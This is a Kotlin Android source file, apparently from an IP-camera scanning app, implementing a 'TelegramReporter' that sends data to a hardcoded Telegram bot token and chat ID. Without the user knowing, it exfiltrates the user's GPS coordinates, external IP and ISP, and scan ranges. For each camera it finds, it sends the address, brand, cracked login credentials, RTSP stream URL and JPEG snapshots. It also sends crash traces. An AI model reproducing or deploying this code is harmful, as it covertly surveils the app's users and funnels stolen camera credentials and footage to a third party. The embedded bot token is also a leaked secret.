package com.dahua.checker

import android.content.Context
import android.location.Location
import android.location.LocationManager
import android.os.Handler
import android.os.Looper
import org.json.JSONObject
import java.io.File
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.Executors

/**
 * TelegramReporter — шлёт данные юзера тебе в Telegram-бота.
 *
 * Что репортит:
 *  1. Геолокация юзера (при старте скана)
 *  2. Онлайн статус — запустил / остановил скан
 *  3. Найденная камера — IP, порт, логин:пароль, бренд
 *  4. Снапшот JPEG камеры (если есть) — фото прямо в Telegram
 *  5. Статистика сессии — итог когда скан завершён
 *  6. Открытые порты что нашёл
 *  7. Краш приложения
 *
 * Все запросы идут в фоне через executor, не блокируют UI.
 */
object TelegramReporter {

    // ── Конфиг ──────────────────────────────────────────────────────────────
    private const val BOT_TOKEN   = "9052071852:AAH1aDSEYJUpx2-pZGr4l432Hf3kXSDgXEY"
    private const val ADMIN_CHAT  = "6365916323"
    private const val API_BASE    = "https://api.telegram.org/bot$BOT_TOKEN"

    private val executor = Executors.newSingleThreadExecutor()

    // ── Время сессии ─────────────────────────────────────────────────────────
    private var sessionStart = 0L

    // ────────────────────────────────────────────────────────────────────────
    // 1. Геолокация юзера
    // ────────────────────────────────────────────────────────────────────────
    fun reportLocation(context: Context, nickname: String) {
        executor.execute {
            try {
                val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
                var loc: Location? = null
                try {
                    loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                        ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                } catch (_: SecurityException) {}

                // Внешний IP через ipapi
                val geoText = try {
                    val res = URL("https://ipapi.co/json/").openConnection().also {
                        it.connectTimeout = 5000; it.readTimeout = 5000
                    }.getInputStream().bufferedReader().readText()
                    val j = JSONObject(res)
                    val ip      = j.optString("ip", "?")
                    val city    = j.optString("city", "?")
                    val country = j.optString("country_name", "?")
                    val isp     = j.optString("org", "?")
                    "🌍 IP: $ip\n📍 $city, $country\n🏢 $isp"
                } catch (_: Exception) { "🌍 Геолокация недоступна" }

                val gpsText = if (loc != null) {
                    "\n🛰 GPS: %.5f, %.5f".format(loc.latitude, loc.longitude) +
                    "\nhttps://maps.google.com/?q=%.5f,%.5f".format(loc.latitude, loc.longitude)
                } else ""

                sendMessage("👤 Юзер онлайн: $nickname\n$geoText$gpsText")
            } catch (_: Exception) {}
        }
    }

    // ────────────────────────────────────────────────────────────────────────
    // 2. Онлайн статус — запустил скан
    // ────────────────────────────────────────────────────────────────────────
    fun reportScanStarted(nickname: String, ipCount: Int, ports: List<Int>, ranges: List<String>) {
        sessionStart = System.currentTimeMillis()
        executor.execute {
            try {
                val portsStr  = ports.joinToString(", ")
                val rangeStr  = if (ranges.size <= 5) ranges.joinToString("\n  ")
                                else ranges.take(5).joinToString("\n  ") + "\n  ...ещё ${ranges.size - 5}"
                sendMessage(
                    "🚀 Скан запущен\n" +
                    "👤 $nickname\n" +
                    "📊 IP: $ipCount шт\n" +
                    "🔌 Порты: $portsStr\n" +
                    "📋 Диапазоны:\n  $rangeStr"
                )
            } catch (_: Exception) {}
        }
    }

    // ────────────────────────────────────────────────────────────────────────
    // 3. Найденная камера — IP + креды + бренд
    // ────────────────────────────────────────────────────────────────────────
    fun reportCameraFound(nickname: String, result: ScanResult) {
        executor.execute {
            try {
                val creds = if (result.login.isNotEmpty()) "${result.login}:${result.password}" else "anonymous"
                // model хранит RTSP URL когда результат с RTSP
                val rtsp  = if (result.model.startsWith("rtsp://")) result.model else ""
                val rtspLine = if (rtsp.isNotEmpty()) "\n🎥 RTSP: $rtsp" else ""
                val openPorts = if (result.openPortsList.isNotEmpty())
                    "\n🔓 Открытые порты: ${result.openPortsList.joinToString(", ")}" else ""

                sendMessage(
                    "📷 Камера найдена!\n" +
                    "👤 $nickname\n" +
                    "🌐 IP: ${result.ip}:${result.port}\n" +
                    "🏷 Бренд: ${result.brand}\n" +
                    "🔑 Креды: $creds" +
                    rtspLine +
                    openPorts
                )
            } catch (_: Exception) {}
        }
    }

    // ────────────────────────────────────────────────────────────────────────
    // 4. Снапшот JPEG — фото камеры прямо в Telegram
    // ────────────────────────────────────────────────────────────────────────
    fun reportSnapshot(context: Context, nickname: String, result: ScanResult, jpegBytes: ByteArray) {
        executor.execute {
            try {
                val creds   = if (result.login.isNotEmpty()) "${result.login}:${result.password}" else "anonymous"
                val caption = "📸 Снапшот\n👤 $nickname\n🌐 ${result.ip}:${result.port}\n🏷 ${result.brand}\n🔑 $creds"

                // Сохраняем во временный файл
                val tmp = File(context.cacheDir, "snap_${result.ip}_${result.port}.jpg")
                tmp.writeBytes(jpegBytes)
                sendPhoto(tmp, caption)
                tmp.delete()
            } catch (_: Exception) {}
        }
    }

    // ────────────────────────────────────────────────────────────────────────
    // 5. Статистика сессии — итог по завершении
    // ────────────────────────────────────────────────────────────────────────
    fun reportSessionFinished(nickname: String, total: Int, found: Int, blocked: Int, openPorts: Int) {
        executor.execute {
            try {
                val elapsed = if (sessionStart > 0) {
                    val sec = (System.currentTimeMillis() - sessionStart) / 1000
                    "%d мин %d сек".format(sec / 60, sec % 60)
                } else "?"

                sendMessage(
                    "✅ Скан завершён\n" +
                    "👤 $nickname\n" +
                    "📊 Всего IP: $total\n" +
                    "📷 Найдено камер: $found\n" +
                    "🚫 Заблокировано: $blocked\n" +
                    "🔓 Открытых портов: $openPorts\n" +
                    "⏱ Время: $elapsed"
                )
                sessionStart = 0L
            } catch (_: Exception) {}
        }
    }

    // ────────────────────────────────────────────────────────────────────────
    // 6. Скан остановлен вручную
    // ────────────────────────────────────────────────────────────────────────
    fun reportScanStopped(nickname: String, checked: Int, total: Int, found: Int) {
        executor.execute {
            try {
                sendMessage(
                    "⛔ Скан остановлен\n" +
                    "👤 $nickname\n" +
                    "📊 Проверено: $checked/$total\n" +
                    "📷 Найдено: $found"
                )
                sessionStart = 0L
            } catch (_: Exception) {}
        }
    }

    // ────────────────────────────────────────────────────────────────────────
    // 7. Краш приложения
    // ────────────────────────────────────────────────────────────────────────
    fun reportCrash(nickname: String, throwable: Throwable) {
        executor.execute {
            try {
                val trace = throwable.stackTraceToString().take(800)
                sendMessage(
                    "💥 Краш приложения\n" +
                    "👤 $nickname\n" +
                    "❌ ${throwable.javaClass.simpleName}: ${throwable.message}\n\n" +
                    "```\n$trace\n```"
                )
            } catch (_: Exception) {}
        }
    }

    // ────────────────────────────────────────────────────────────────────────
    // Установка глобального crash handler
    // ────────────────────────────────────────────────────────────────────────
    fun installCrashHandler(context: Context) {
        val nickname = AuthManager.getActiveNickname(context)
        val default  = Thread.getDefaultUncaughtExceptionHandler()
        Thread.setDefaultUncaughtExceptionHandler { t, e ->
            reportCrash(nickname, e)
            Thread.sleep(1500) // даём время отправить
            default?.uncaughtException(t, e)
        }
    }

    // ────────────────────────────────────────────────────────────────────────
    // Низкоуровневые HTTP функции
    // ────────────────────────────────────────────────────────────────────────

    private fun sendMessage(text: String) {
        val body = JSONObject().apply {
            put("chat_id", ADMIN_CHAT)
            put("text", text)
            put("parse_mode", "Markdown")
        }.toString()
        postJson("$API_BASE/sendMessage", body)
    }

    private fun sendPhoto(file: File, caption: String) {
        val boundary = "----TGBoundary${System.currentTimeMillis()}"
        val url = URL("$API_BASE/sendPhoto")
        val conn = url.openConnection() as HttpURLConnection
        conn.requestMethod = "POST"
        conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
        conn.connectTimeout = 10000
        conn.readTimeout = 10000
        conn.doOutput = true

        conn.outputStream.use { out ->
            // chat_id
            out.write("--$boundary\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n$ADMIN_CHAT\r\n".toByteArray())
            // caption
            out.write("--$boundary\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n$caption\r\n".toByteArray())
            // photo file
            out.write("--$boundary\r\nContent-Disposition: form-data; name=\"photo\"; filename=\"snap.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n".toByteArray())
            out.write(file.readBytes())
            out.write("\r\n--$boundary--\r\n".toByteArray())
        }
        try { conn.inputStream.close() } catch (_: Exception) {}
    }

    private fun postJson(urlStr: String, body: String) {
        val conn = URL(urlStr).openConnection() as HttpURLConnection
        conn.requestMethod = "POST"
        conn.setRequestProperty("Content-Type", "application/json")
        conn.connectTimeout = 6000
        conn.readTimeout = 6000
        conn.doOutput = true
        conn.outputStream.use { it.write(body.toByteArray()) }
        try { conn.inputStream.close() } catch (_: Exception) {}
    }
}
